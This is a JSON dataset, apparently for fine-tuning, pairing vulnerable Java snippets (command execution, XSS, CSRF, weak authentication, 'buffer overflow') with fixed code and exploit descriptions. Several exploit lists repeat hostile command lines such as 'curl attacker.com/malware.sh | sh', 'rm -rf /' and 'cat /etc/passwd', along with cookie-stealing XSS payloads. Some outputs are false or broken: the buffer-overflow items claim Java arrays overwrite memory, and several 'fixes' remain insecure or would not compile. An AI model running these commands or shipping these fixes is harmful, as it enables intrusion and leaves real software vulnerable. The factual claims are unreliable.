[
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Remote Code Execution (RCE)\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        try {\n            System.out.print(\"Enter command: \");\n            String command = reader.readLine();\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n- CVSS Score: 9.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.IOException;\\nimport java.io.InputStreamReader;\\n\\npublic class VulnerableApp {\\n    public static void main(String[] args) {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        try {\\n            System.out.print(\\\"Enter command: \\\");\\n            String command = reader.readLine();\\n            Process process = Runtime.getRuntime().exec(command);\\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n            String line;\\n            while ((line = outputReader.readLine()) != null) {\\n                System.out.println(line);\\n            }\\n        } catch (IOException e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "vulnerability_type": "Remote Code Execution (RCE)",
      "cvss_score": 9.8,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.IOException;\\nimport java.io.InputStreamReader;\\n\\npublic class SecureApp {\\n    public static void main(String[] args) {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        try {\\n            System.out.print(\\\"Enter command: \\\");\\n            String command = reader.readLine();\\n            if (command.equals(\\\"ls\\\") || command.equals(\\\"whoami\\\")) {\\n                Process process = Runtime.getRuntime().exec(command);\\n                BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n                String line;\\n                while ((line = outputReader.readLine()) != null) {\\n                    System.out.println(line);\\n                }\\n            } else {\\n                System.out.println(\\\"Command not allowed.\\\");\\n            }\\n        } catch (IOException e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'rm -rf /' to delete system files.",
        "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
        "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Scripting (XSS)\n- Vulnerable Code: import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        if (userInput != null) {\n            response.setContentType(\"text/html\");\n            response.getWriter().println(\"<html><body>\");\n            response.getWriter().println(\"User Input: \" + userInput);\n            response.getWriter().println(\"</body></html>\");\n        }\n    }\n}\n- CVSS Score: 6.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\nimport java.io.IOException;\\n\\npublic class VulnerableServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String userInput = request.getParameter(\\\"userInput\\\");\\n        if (userInput != null) {\\n            response.setContentType(\\\"text/html\\\");\\n            response.getWriter().println(\\\"<html><body>\\\");\\n            response.getWriter().println(\\\"User Input: \\\" + userInput);\\n            response.getWriter().println(\\\"</body></html>\\\");\\n        }\\n    }\\n}",
      "vulnerability_type": "Cross-Site Scripting (XSS)",
      "cvss_score": 6.1,
      "fixed_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\nimport java.io.IOException;\\n\\npublic class SecureServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String userInput = request.getParameter(\\\"userInput\\\");\\n        if (userInput != null) {\\n            response.setContentType(\\\"text/html\\\");\\n            response.getWriter().println(\\\"<html><body>\\\");\\n            response.getWriter().println(\\\"User Input: \\\" + org.owasp.encoder.Encode.forHtml(userInput));\\n            response.getWriter().println(\\\"</body></html>\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker can inject a script like <script>alert('XSS')</script> to execute arbitrary JavaScript in the user's browser.",
        "They could use <img src=x onerror=alert(document.cookie)> to steal cookies or sensitive data.",
        "Cross-site requests with injected scripts might lead to session hijacking."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Remote Code Execution (RCE)\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command: \");\n        String command = reader.readLine();\n        Process process = Runtime.getRuntime().exec(command);\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = output.readLine()) != null) {\n            System.out.println(line);\n        }\n    }\n}\n- CVSS Score: 9.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\n\\npublic class VulnerableApp {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        System.out.println(\\\"Enter command: \\\");\\n        String command = reader.readLine();\\n        Process process = Runtime.getRuntime().exec(command);\\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n        String line;\\n        while ((line = output.readLine()) != null) {\\n            System.out.println(line);\\n        }\\n    }\\n}",
      "vulnerability_type": "Remote Code Execution (RCE)",
      "cvss_score": 9.8,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\n\\npublic class SecureApp {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        System.out.println(\\\"Enter command: \\\");\\n        String command = reader.readLine();\\n        if (command.equals(\\\"allowed_command\\\")) {\\n            Process process = Runtime.getRuntime().exec(command);\\n            BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n            String line;\\n            while ((line = output.readLine()) != null) {\\n                System.out.println(line);\\n            }\\n        } else {\\n            System.out.println(\\\"Command not allowed\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'rm -rf /' to delete system files.",
        "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
        "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Buffer Overflow\n- Vulnerable Code: public class VulnerableClass {\\n    public void vulnerableMethod(String input) {\\n        byte[] buffer = new byte[10];\\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\\n    }\\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class VulnerableClass {\\n    public void vulnerableMethod(String input) {\\n        byte[] buffer = new byte[10];\\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\\n    }\\n}",
      "vulnerability_type": "Buffer Overflow",
      "cvss_score": 7.5,
      "fixed_code": "public class SecureClass {\\n    public void secureMethod(String input) {\\n        if (input == null || input.length() > 10) {\\n            throw new IllegalArgumentException(\\\"Input exceeds buffer size\\\");\\n        }\\n        byte[] buffer = new byte[10];\\n        System.arraycopy(input.getBytes(), 0, buffer, 0, Math.min(10, input.length()));\\n    }\\n}",
      "exploit_ways": [
        "An attacker could provide a string longer than 10 characters to overwrite adjacent memory.",
        "This could lead to executing arbitrary code if the overwritten memory includes return addresses or function pointers.",
        "Attackers might exploit this to gain unauthorized access by manipulating control flow in the program."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: public class AuthManager {\n    private String username;\n    private String password;\n\n    public AuthManager(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public boolean login(String user, String pass) {\n        return user.equals(username) && pass.equals(password);\n    }\n}\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class AuthManager {\\n    private String username;\\n    private String password;\\n\\n    public AuthManager(String username, String password) {\\n        this.username = username;\\n        this.password = password;\\n    }\\n\\n    public boolean login(String user, String pass) {\\n        return user.equals(username) && pass.equals(password);\\n    }\\n}",
      "vulnerability_type": "Broken Authentication",
      "cvss_score": 6.5,
      "fixed_code": "public class AuthManager {\\n    private byte[] usernameHash;\\n    private byte[] passwordHash;\\n\\n    public AuthManager(String username, String password) throws NoSuchAlgorithmException {\\n        MessageDigest md = MessageDigest.getInstance(\\\"SHA-256\\\");\\n        this.usernameHash = md.digest(username.getBytes(StandardCharsets.UTF_8));\\n        this.passwordHash = md.digest(password.getBytes(StandardCharsets.UTF_8));\\n    }\\n\\n    public boolean login(String user, String pass) throws NoSuchAlgorithmException {\\n        MessageDigest md = MessageDigest.getInstance(\\\"SHA-256\\\");\\n        return Arrays.equals(md.digest(user.getBytes(StandardCharsets.UTF_8)), usernameHash)\\n            && Arrays.equals(md.digest(pass.getBytes(StandardCharsets.UTF_8)), passwordHash);\\n    }\\n}",
      "exploit_ways": [
        "An attacker can brute-force the login credentials due to lack of rate limiting.",
        "If the code is part of a larger system, they could attempt dictionary attacks with common passwords.",
        "The vulnerability allows for easy credential stuffing if username and password pairs are known."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String amount = request.getParameter(\"amount\");\n        String destinationAccount = request.getParameter(\"destinationAccount\");\n        // Simulate transferring money without CSRF protection\n        transferMoney(amount, destinationAccount);\n    }\n\n    private void transferMoney(String amount, String destinationAccount) {\n        // Transfer logic here\n    }\n}\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class TransferServlet extends HttpServlet {\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\n        String amount = request.getParameter(\\\"amount\\\");\\n        String destinationAccount = request.getParameter(\\\"destinationAccount\\\");\\n        // Simulate transferring money without CSRF protection\\n        transferMoney(amount, destinationAccount);\\n    }\\n\\n    private void transferMoney(String amount, String destinationAccount) {\\n        // Transfer logic here\\n    }\\n}",
      "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
      "cvss_score": 6.8,
      "fixed_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\nimport java.util.UUID;\\n\\npublic class TransferServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String csrfToken = UUID.randomUUID().toString();\\n        request.getSession().setAttribute(\\\"csrfToken\\\", csrfToken);\\n        // Render form with the CSRF token\\n    }\\n\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\n        String sessionCsrfToken = (String) request.getSession().getAttribute(\\\"csrfToken\\\");\\n        String requestCsrfToken = request.getParameter(\\\"csrfToken\\\");\\n\\n        if (!sessionCsrfToken.equals(requestCsrfToken)) {\\n            throw new SecurityException(\\\"CSRF Token Validation Failed\\\");\\n        }\\n\\n        String amount = request.getParameter(\\\"amount\\\");\\n        String destinationAccount = request.getParameter(\\\"destinationAccount\\\");\\n        transferMoney(amount, destinationAccount);\\n    }\\n\\n    private void transferMoney(String amount, String destinationAccount) {\\n        // Transfer logic here\\n    }\\n}",
      "exploit_ways": [
        "An attacker can craft a malicious form submission that tricks the victim into transferring funds without their knowledge.",
        "Using social engineering, an attacker can trick users to click on links or visit pages with embedded requests that perform unauthorized actions.",
        "By injecting crafted HTML content in vulnerable applications, attackers can automatically submit forged requests when users browse to the injected page."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Privilege Escalation\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass VulnerableApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command to execute:\");\n        String command = reader.readLine();\n        Process process = Runtime.getRuntime().exec(command);\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = output.readLine()) != null) {\n            System.out.println(line);\n        }\n    }\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nclass VulnerableApp {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        System.out.println(\\\"Enter command to execute:\\\");\\n        String command = reader.readLine();\\n        Process process = Runtime.getRuntime().exec(command);\\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n        String line;\\n        while ((line = output.readLine()) != null) {\\n            System.out.println(line);\\n        }\\n    }\\n}",
      "vulnerability_type": "Privilege Escalation",
      "cvss_score": 7.5,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nclass SecureApp {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        System.out.println(\\\"Enter command to execute:\\\");\\n        String command = reader.readLine();\\n        if (command.matches(\\\"[a-zA-Z0-9\\\\s]*\\\")) {\\n            Process process = Runtime.getRuntime().exec(command);\\n            BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n            String line;\\n            while ((line = output.readLine()) != null) {\\n                System.out.println(line);\\n            }\\n        } else {\\n            System.out.println(\\\"Invalid command.\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'sudo rm -rf /' to delete system files.",
        "Could use 'whoami > /tmp/user.txt' to write user information to a file.",
        "Chain commands like 'id; cat /etc/passwd' to execute multiple commands."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Remote Code Execution (RCE)\n- Vulnerable Code: import java.util.Scanner;\\npublic class VulnerableApp {\\n    public static void main(String[] args) throws Exception {\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.println(\"Enter command to execute:\");\\n        String command = scanner.nextLine();\\n        Runtime.getRuntime().exec(command);\\n    }\\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.util.Scanner;\\npublic class VulnerableApp {\\n    public static void main(String[] args) throws Exception {\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.println(\\\"Enter command to execute:\\\");\\n        String command = scanner.nextLine();\\n        Runtime.getRuntime().exec(command);\\n    }\\n}",
      "vulnerability_type": "Remote Code Execution (RCE)",
      "cvss_score": 8.2,
      "fixed_code": "import java.util.Scanner;\\npublic class SecureApp {\\n    public static void main(String[] args) throws Exception {\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.println(\\\"Enter command to execute:\\\");\\n        String command = scanner.nextLine();\\n        if (command.equals(\\\"allowed_command\\\")) {\\n            Runtime.getRuntime().exec(command);\\n        } else {\\n            System.out.println(\\\"Command not allowed\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'rm -rf /' to delete system files.",
        "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
        "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Buffer Overflow\n- Vulnerable Code: public void bufferOverflowVulnerable(byte[] input) {\n    byte[] buffer = new byte[16];\n    System.arraycopy(input, 0, buffer, 0, input.length);\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public void bufferOverflowVulnerable(byte[] input) {\\n    byte[] buffer = new byte[16];\\n    System.arraycopy(input, 0, buffer, 0, input.length);\\n}",
      "vulnerability_type": "Buffer Overflow",
      "cvss_score": 7.5,
      "fixed_code": "public void bufferOverflowFixed(byte[] input) {\\n    if (input.length > 16) {\\n        throw new IllegalArgumentException(\\\"Input exceeds buffer size\\\");\\n    }\\n    byte[] buffer = new byte[16];\\n    System.arraycopy(input, 0, buffer, 0, input.length);\\n}",
      "exploit_ways": [
        "An attacker can provide an array larger than 16 bytes to overwrite adjacent memory locations.",
        "This could be used to corrupt the stack and execute arbitrary code by overwriting return addresses.",
        "Overwriting control data structures in memory may lead to unauthorized access or system crashes."
      ]
    }
  },
  {
